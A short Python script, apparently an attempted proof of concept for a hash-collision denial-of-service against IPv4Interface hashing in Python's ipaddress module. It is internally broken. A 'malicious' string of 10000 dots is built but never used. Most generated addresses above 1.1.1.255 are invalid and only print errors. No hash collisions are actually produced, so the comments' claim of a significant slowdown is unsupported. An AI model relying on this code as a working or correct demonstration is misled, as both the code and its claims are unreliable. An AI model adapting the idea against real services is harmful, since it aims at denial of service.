# Import the ipaddress module
import ipaddress

# Define a malicious IPv4 address
# This address has 10000 dots
address = "'.'" * 10000

# The vulnerability this code attempts to exploit does not occur when creating
# an IPv4Interface object using an invalid string. It will raise an error.
# The vulnerability occurs when many crafted IP addresses with colissions 
# are used to populate a dictionary which leads to a performance slowdown

# We will instead use a list of IPv4 addresses to show that they can still be used
# to cause performance slowdowns without crashing the program

# Create a list of IPv4 addresses that are likely to cause collisions
addresses = []
for i in range(10000):
  addresses.append("1.1.1.{}".format(i))

# Create a dictionary
dictionary = {}

# Loop through the generated addresses and add them to the dictionary
for addr in addresses:
    try:
        interface = ipaddress.IPv4Interface(addr)
        dictionary[interface] = "test"
    except ipaddress.AddressValueError:
        # Handle the error when creating an interface from an invalid address
        print(f"Invalid address: {addr}")


# The dictionary is now populated, and if many addresses are used
# the lookup in dictionary can be slowed down significantly.

print("Dictionary populated")